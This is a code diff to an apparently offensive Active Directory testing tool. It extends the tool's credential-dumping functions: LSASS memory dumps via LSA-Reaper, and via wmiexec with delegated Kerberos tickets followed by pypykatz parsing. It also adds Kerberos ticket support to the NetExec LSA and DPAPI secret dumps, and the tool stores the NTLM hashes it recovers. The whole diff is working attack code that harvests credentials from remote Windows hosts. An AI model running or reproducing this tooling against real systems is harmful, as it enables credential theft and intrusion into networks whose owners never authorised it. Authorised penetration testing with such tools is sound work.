@@ -45,6 +45,18 @@ from adscan_internal import (
 from adscan_internal.integrations.netexec.parsers import (
     parse_netexec_delegated_auth_failure,
 )
+from adscan_internal.services.exploitation.lsass import (
+    DelegatedLsassDumpRequest,
+    LsaReaperCommandRequest,
+    LsassDumpOutcome,
+    LsassDumpService,
+    build_lsa_reaper_command,
+    parse_pypykatz_credentials,
+    resolve_lsa_reaper_python,
+    resolve_lsa_reaper_script_path,
+    resolve_lsassy_executable,
+    resolve_wmiexec_script,
+)
 from adscan_internal.rich_output import (
     ScanProgressTracker,
     confirm_operation,
@@ -2084,35 +2096,200 @@ def run_dump_lsass(
     islocal: str | None = None,  # kept for future extensions
 ) -> None:
     """Dump LSASS using LSA-Reaper (hash or password auth)."""
-    from adscan_internal.cli.tools_env import TOOLS_INSTALL_DIR
+    if str(password or "").lower().endswith(".ccache"):
+        _run_dump_lsass_with_delegated_ticket(
+            shell,
+            domain=domain,
+            host=host,
+            username=username,
+            kerberos_ticket=password,
+        )
+        return
 
-    lsa_reaper_python = shell.lsa_reaper_python or "python"
-    if shell.is_hash(password):
-        marked_domain = mark_sensitive(domain, "domain")
-        marked_username = mark_sensitive(username, "user")
-        marked_host = mark_sensitive(host, "hostname")
-        marked_password = mark_sensitive(password, "password")
-        lsa_reaper_path = os.path.join(TOOLS_INSTALL_DIR, "LSA-Reaper", "lsa-reaper.py")
-        command = (
-            f"echo $'Y\\n{shell.domains_data[domain]['pdc']}\\n' | {lsa_reaper_python} "
-            f"{lsa_reaper_path} -ip {shell.interface} {marked_domain}/'{marked_username}'@{marked_host} "
-            f"-hashes :{marked_password} -ap -av -l domains/{marked_domain}"
-        )
-    else:
-        marked_domain = mark_sensitive(domain, "domain")
-        marked_username = mark_sensitive(username, "user")
-        marked_password = mark_sensitive(password, "password")
-        marked_host = mark_sensitive(host, "hostname")
-        lsa_reaper_path = os.path.join(TOOLS_INSTALL_DIR, "LSA-Reaper", "lsa-reaper.py")
-        command = (
-            f"echo $'Y\\n{shell.domains_data[domain]['pdc']}\\n' | {lsa_reaper_python} "
-            f"{lsa_reaper_path} -ip {shell.interface} {marked_domain}/'{marked_username}':'{marked_password}'@{marked_host} "
-            f"-ap -av -l domains/{marked_domain}"
-        )
+    command = _build_legacy_lsa_reaper_command(
+        shell,
+        domain=domain,
+        host=host,
+        username=username,
+        password=password,
+    )
+    if not command:
+        return
 
     marked_host = mark_sensitive(host, "hostname")
     print_info(f"Dumping LSASS from host {marked_host}")
     execute_dump_lsass(shell, command, domain, host)
+
+
+def _resolve_lsa_reaper_python(shell: Any) -> str | None:
+    """Resolve the Python interpreter to run LSA-Reaper."""
+    return resolve_lsa_reaper_python(
+        explicit_python=str(getattr(shell, "lsa_reaper_python", "") or "").strip()
+    )
+
+
+def _resolve_lsa_reaper_script_path() -> str | None:
+    """Resolve the installed LSA-Reaper script path across host/runtime layouts."""
+    from adscan_internal.cli.tools_env import TOOLS_INSTALL_DIR
+
+    return resolve_lsa_reaper_script_path(tools_install_dir=TOOLS_INSTALL_DIR)
+
+
+def _build_legacy_lsa_reaper_command(
+    shell: Any,
+    *,
+    domain: str,
+    host: str,
+    username: str,
+    password: str,
+) -> str | None:
+    """Build the legacy LSA-Reaper command for password/hash-based dumping."""
+    lsa_reaper_python = _resolve_lsa_reaper_python(shell)
+    lsa_reaper_path = _resolve_lsa_reaper_script_path()
+    if not lsa_reaper_python or not lsa_reaper_path:
+        print_error(
+            "LSA-Reaper is not installed correctly. Please run 'adscan install' "
+            "or fix the LSA-Reaper runtime."
+        )
+        return None
+
+    marked_domain = mark_sensitive(domain, "domain")
+    marked_username = mark_sensitive(username, "user")
+    marked_host = mark_sensitive(host, "hostname")
+    marked_password = mark_sensitive(password, "password")
+    marked_pdc = mark_sensitive(shell.domains_data[domain]["pdc"], "hostname")
+
+    return build_lsa_reaper_command(
+        LsaReaperCommandRequest(
+            python_path=lsa_reaper_python,
+            script_path=lsa_reaper_path,
+            interface=str(shell.interface),
+            pdc=marked_pdc,
+            domain=marked_domain,
+            host=marked_host,
+            username=marked_username,
+            password=marked_password,
+            log_dir=domain_relpath(shell.domains_dir, domain, "smb"),
+            is_hash=bool(shell.is_hash(password)),
+        )
+    )
+
+
+def _resolve_wmiexec_script(shell: Any) -> str | None:
+    """Resolve wmiexec.py from the configured Impacket installation."""
+    return resolve_wmiexec_script(
+        impacket_scripts_dir=str(getattr(shell, "impacket_scripts_dir", "") or "").strip()
+    )
+
+
+def _resolve_lsassy_script(shell: Any) -> str | None:
+    """Resolve lsassy from the configured isolated installation."""
+    return resolve_lsassy_executable(
+        explicit_path=str(getattr(shell, "lsassy_path", "") or "").strip()
+    )
+
+
+def _parse_lsass_pypykatz_credentials(output: str) -> list[tuple[str, str]]:
+    """Extract username/NTLM pairs from pypykatz minidump output."""
+    return [(cred.username, cred.nt_hash) for cred in parse_pypykatz_credentials(output)]
+
+
+def _run_dump_lsass_with_delegated_ticket(
+    shell: Any,
+    *,
+    domain: str,
+    host: str,
+    username: str,
+    kerberos_ticket: str,
+) -> None:
+    """Dump LSASS using delegated Kerberos access via wmiexec + SMB download."""
+    wmiexec_path = _resolve_wmiexec_script(shell)
+    if not wmiexec_path:
+        print_error(
+            "wmiexec.py is not available. Please ensure Impacket is installed."
+        )
+        return
+
+    if not getattr(shell, "netexec_path", None):
+        print_error("NetExec is not available. Please ensure NetExec is installed.")
+        return
+
+    dump_dir = os.path.join(
+        str(getattr(shell, "current_workspace_dir", "") or os.getcwd()),
+        domain_relpath(shell.domains_dir, domain, "smb"),
+    )
+    os.makedirs(dump_dir, exist_ok=True)
+    local_dump_path = os.path.join(
+        dump_dir,
+        f"dump_{_dump_target_token(host)}_lsass.dmp",
+    )
+
+    operation_details = {
+        "Domain": domain,
+        "Target": host,
+        "Username": username,
+        "Auth Type": "Delegated Kerberos Ticket",
+        "Output": local_dump_path,
+    }
+    print_operation_header("LSASS Memory Dump", details=operation_details, icon="🧠")
+
+    dc_ip = str(shell.domains_data.get(domain, {}).get("dc_ip") or "").strip()
+    print_info("Creating remote LSASS dump via wmiexec and delegated Kerberos ticket.")
+    auth_str = shell.build_auth_nxc(username, kerberos_ticket, domain, kerberos=True)
+    outcome = LsassDumpService().dump_with_delegated_ticket(
+        DelegatedLsassDumpRequest(
+            domain=domain,
+            host=host,
+            username=username,
+            kerberos_ticket=kerberos_ticket,
+            wmiexec_path=wmiexec_path,
+            netexec_path=str(shell.netexec_path),
+            pypykatz_path=str(getattr(shell, "pypykatz_path", "") or "pypykatz").strip(),
+            local_dump_path=local_dump_path,
+            nxc_auth=auth_str,
+            dc_ip=dc_ip or None,
+            lsassy_path=_resolve_lsassy_script(shell),
+            preferred_backend="auto",
+            run_command=shell.run_command,
+        )
+    )
+    _render_lsass_dump_outcome(shell, domain=domain, host=host, outcome=outcome)
+
+
+def _render_lsass_dump_outcome(
+    shell: Any,
+    *,
+    domain: str,
+    host: str,
+    outcome: LsassDumpOutcome,
+) -> None:
+    """Render and persist the result of one LSASS dump backend."""
+    if not outcome.success:
+        print_error(
+            f"Error running LSASS dump backend {outcome.backend}: "
+            f"{outcome.error_message or 'unknown error'}"
+        )
+        return
+
+    if outcome.local_dump_path:
+        print_success(
+            "LSASS dump downloaded successfully to "
+            f"{mark_sensitive(outcome.local_dump_path, 'path')}"
+        )
+    else:
+        print_success(f"LSASS dump completed successfully with backend {outcome.backend}.")
+    for credential in outcome.credentials:
+        marked_user = mark_sensitive(credential.username, "user")
+        marked_hash = mark_sensitive(credential.nt_hash, "password")
+        print_info(f"Recovered NTLM hash from LSASS: {marked_user} -> {marked_hash}")
+        shell.add_credential(domain, credential.username, credential.nt_hash)
+    for warning in outcome.warnings:
+        warning_text = str(warning or "").replace(
+            "Standard minidump parsing",
+            f"Standard minidump parsing on {mark_sensitive(host, 'hostname')}",
+            1,
+        )
+        print_warning(warning_text)
 
 
 def run_dump_lsa(
@@ -2126,6 +2303,7 @@ def run_dump_lsa(
     include_machine_accounts: bool = False,
 ) -> None:
     """Dump LSA secrets over SMB using NetExec."""
+    kerberos_ticket_prefix = ""
     if _is_bulk_dump_target(host) and not _ensure_pro_for_all_hosts_dump(
         shell, dump_label="LSA"
     ):
@@ -2152,7 +2330,15 @@ def run_dump_lsa(
     command: str | None = None
 
     if islocal == "false":
-        auth_str = shell.build_auth_nxc(username, password, domain)
+        use_ccache = password.lower().endswith(".ccache")
+        auth_str = shell.build_auth_nxc(
+            username,
+            password,
+            domain,
+            kerberos=use_ccache,
+        )
+        if use_ccache:
+            kerberos_ticket_prefix = f"KRB5CCNAME={shlex.quote(password)} "
         delegate_suffix = _build_delegate_suffix(shell, domain, username)
         if is_multi_host_target:
             hosts_file = _resolve_bulk_hosts_target(
@@ -2165,12 +2351,15 @@ def run_dump_lsa(
                 return
             log_file = dump_output
             command = (
-                f"{shell.netexec_path} smb {shlex.quote(hosts_file)} {auth_str} -t 10 --timeout 60 --smb-timeout 30 "
+                f"{kerberos_ticket_prefix}{shell.netexec_path} smb {shlex.quote(hosts_file)} {auth_str} -t 10 --timeout 60 --smb-timeout 30 "
                 f"--log {log_file} --lsa{delegate_suffix}"
             )
         elif host != "All":
             log_file = dump_output
-            command = f"{shell.netexec_path} smb {host} {auth_str} --log {log_file} --lsa{delegate_suffix}"
+            command = (
+                f"{kerberos_ticket_prefix}{shell.netexec_path} smb {host} {auth_str} "
+                f"--log {log_file} --lsa{delegate_suffix}"
+            )
     else:
         auth_str = shell.build_auth_nxc(username, password)
         if host != "All":
@@ -2318,6 +2507,7 @@ def run_dump_dpapi(
     islocal: str,
 ) -> None:
     """Dump DPAPI credentials over SMB using NetExec."""
+    kerberos_ticket_prefix = ""
     if _is_bulk_dump_target(host) and not _ensure_pro_for_all_hosts_dump(
         shell, dump_label="DPAPI"
     ):
@@ -2345,7 +2535,15 @@ def run_dump_dpapi(
 
     command: str | None = None
     if islocal == "false":
-        auth_str = shell.build_auth_nxc(username, password, domain)
+        use_ccache = password.lower().endswith(".ccache")
+        auth_str = shell.build_auth_nxc(
+            username,
+            password,
+            domain,
+            kerberos=use_ccache,
+        )
+        if use_ccache:
+            kerberos_ticket_prefix = f"KRB5CCNAME={shlex.quote(password)} "
         delegate_suffix = _build_delegate_suffix(shell, domain, username)
         if is_multi_host_target:
             hosts_target = _resolve_bulk_hosts_target(
@@ -2357,13 +2555,13 @@ def run_dump_dpapi(
                 print_warning("No multi-host targets are available for this domain.")
                 return
             command = (
-                f"{shell.netexec_path} smb {shlex.quote(hosts_target)} "
+                f"{kerberos_ticket_prefix}{shell.netexec_path} smb {shlex.quote(hosts_target)} "
                 f"{auth_str} -t 1 --timeout 60 --smb-timeout 30 --log "
                 f"{dump_output} --dpapi{delegate_suffix} "
             )
         elif host != "All":
             command = (
-                f"{shell.netexec_path} smb {host} {auth_str} --log "
+                f"{kerberos_ticket_prefix}{shell.netexec_path} smb {host} {auth_str} --log "
                 f"{dump_output} --dpapi{delegate_suffix} "
             )
     else:
@@ -2954,6 +3152,15 @@ def execute_dump_dpapi(
         errors_output = completed_process.stderr
 
         if completed_process.returncode == 0:
+            auth_failure = parse_netexec_delegated_auth_failure(
+                output
+            ) or parse_netexec_delegated_auth_failure(errors_output)
+            if auth_failure:
+                print_error(
+                    "Error executing DPAPI dump: "
+                    f"{auth_failure.line}"
+                )
+                return
             process_dpapi_output(
                 shell,
                 output=output,
